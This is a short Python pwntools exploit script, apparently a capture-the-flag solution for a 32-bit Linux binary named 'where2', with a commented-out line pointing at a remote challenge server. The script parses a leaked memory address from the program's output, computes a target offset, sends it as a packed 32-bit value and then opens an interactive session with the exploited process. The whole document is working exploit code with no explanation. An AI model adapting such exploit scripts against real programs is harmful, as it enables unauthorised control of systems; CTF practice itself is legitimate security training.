from pwn import *
context(arch='i386', os='linux')

bin = process('./where2')

# REMOTE
# bin = remote('pwn.n0l3ptr.com', 9984)

line = bin.recv()
print line
addr = int(line.split(' = ')[1][:-3], 16)
print hex(addr)
offset = addr - 0x204
offset = offset + 12
bin.send(p32(offset))
bin.interactive()
